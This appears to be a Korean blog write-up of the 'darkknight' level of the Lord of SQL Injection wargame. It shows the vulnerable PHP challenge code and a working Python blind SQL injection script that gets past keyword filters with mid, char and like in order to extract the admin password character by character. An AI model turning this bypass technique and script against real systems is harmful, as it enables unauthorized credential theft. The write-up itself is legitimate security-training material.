---
layout: post
title: ! "[LOS] darkknight"
categories: [LOS]
excerpt: " "
comments: true
share: true
tags:
  - LOS
  - Web-hacking
  - darknight
  - write-up
---

### https://los.eagle-jump.org/ 버전
![]({{ site.baseurl }}/assets/posts/los/darkknight.png)

`query : select id from prob_darkknight where id='guest' and pw='' and no=`

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  if(preg_match('/\'|substr|ascii|=/i', $_GET[no])) exit("HeHe"); 
  $query = "select id from prob_darkknight where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_darkknight where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("darkknight"); 
  highlight_file(__FILE__); 
?>
```

darknight 문제는 substr, ascii가 필터링 된다.
기존 코드를 좀 수정해서

1. substr -> mid
2. ascii -> char

이렇게 바꿔주었다.

admin을 char함수로 표현하려면 `char(97,100,109,105,110)` 이 된다.

1. left : 문자의 왼쪽을 기준으로 일정 갯수를 가져온다.
2. mid : 문자의 지정한 시작 위치를 기준으로 일정 갯수를 가져온다.
3. right : 문자의 오른쪽을 기준으로 일정 갯수를 가져온다.

처음에 코드가 잘 안돌아갔는데 기존 코드는 string.ascii_letters를 이용해서 `for a in alpha` 이런식으로 돌게 했는데
이번 코드는 48부터 128까지 범위를 주고 `char(str(a))` 로 바꿔주었다.
출력을 할 때도 파이썬의 chr함수를 사용해 `chr(a)` 이렇게 출력해주었다.

### 코드
```php
from requests import get
import string
from time import sleep

url="https://los.eagle-jump.org/darkknight_~~~.php"
cookies = dict(PHPSESSID="세션 아이디")
special_strings = "~!@#$%^&*()+-_{}[]<>"
alpha = string.ascii_letters+string.digits+special_strings
result = ""

for i in range(1,20):
    parameter = "?pw=1&no=1 || length(pw) like "+str(i)
    new_url = url + parameter
    r = get(new_url, cookies=cookies)

    if r.text.find("Hello admin") > 0:
        length = i + 1
        print("password length is "+str(i))
        break
for i in range(1, length):
    for a in range(48,128):
        parameter ="?pw=1&no=1 || id like char(97,100,109,105,110) %26%26 mid(pw,"+str(i)+",1) like char("+str(a)+")"
        new_url = url + parameter
        r = get(new_url, cookies=cookies)

        if r.text.find("Hello admin") > 0:
            print(str(i) + " -> "+chr(a))
            result += chr(a)
            break

    if i == 1 and result == "":
        print("password not found")
        exit(0)

    if i == length-1:
        print("\npassword is"+result)
        print("\n")
```

![]({{ site.baseurl }}/assets/posts/los/darkknight_result.png)

결과대로 `1C62BA6F` 를 `?pw=1C62BA6F` 를 입력했는데 안돼서 뭐지..? 했는데
소문자로 바꿔서 입력하니 풀렸다.

![]({{ site.baseurl }}/assets/posts/los/darkknight_clear.png)


### https://los.rubiya.kr 버전
![]({{ site.baseurl }}/assets/posts/los/darkknight_py_result.png)

![]({{ site.baseurl }}/assets/posts/los/darkknight_py_clear.png)
